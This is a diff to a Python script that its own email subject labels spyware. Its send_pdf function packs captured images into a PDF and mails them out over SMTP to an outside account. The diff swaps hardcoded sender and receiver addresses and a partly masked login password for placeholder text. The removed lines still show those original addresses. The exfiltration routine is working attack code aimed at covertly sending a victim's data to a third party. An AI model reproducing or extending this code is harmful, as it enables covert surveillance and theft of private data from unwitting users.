@@ -33,12 +33,12 @@ def send_pdf(file_path):
     else:
         if(check_net()):
             img = Image.open(img_list[0])
-            img.save(f"{file_path}\images.pdf",save_all= True,append_images=[Image.open(i) for i in img_list[:149]])
+            img.save(f"{file_path}\images.pdf",save_all= True,append_images=[Image.open(i) for i in img_list[0:149]])
                             
             message = MIMEMultipart()
-            message["From"] = "mtemp2415@hotmail.com"
-            message["To"] = "mtemp2415@gmail.com"
-            message["Subject"] = "Gelen Veriler"
+            message["From"] = "sender email adress"
+            message["To"] = "receiver email adress"
+            message["Subject"] = "incoming Data in Spyware"
 
 
             binary_pdf = open(f"{file_path}\images.pdf", 'rb')
@@ -59,9 +59,9 @@ def send_pdf(file_path):
             
             mail.starttls()
             
-            mail.login("mtemp2415@hotmail.com","***123***")
+            mail.login("sender email address","password")
             
-            mail.sendmail("mtemp2415@hotmail.com", "mtemp2415@gmail.com",message.as_string())
+            mail.sendmail("sender email address", "Receiver email adress",message.as_string())
             
             mail.close()
             binary_pdf.close()
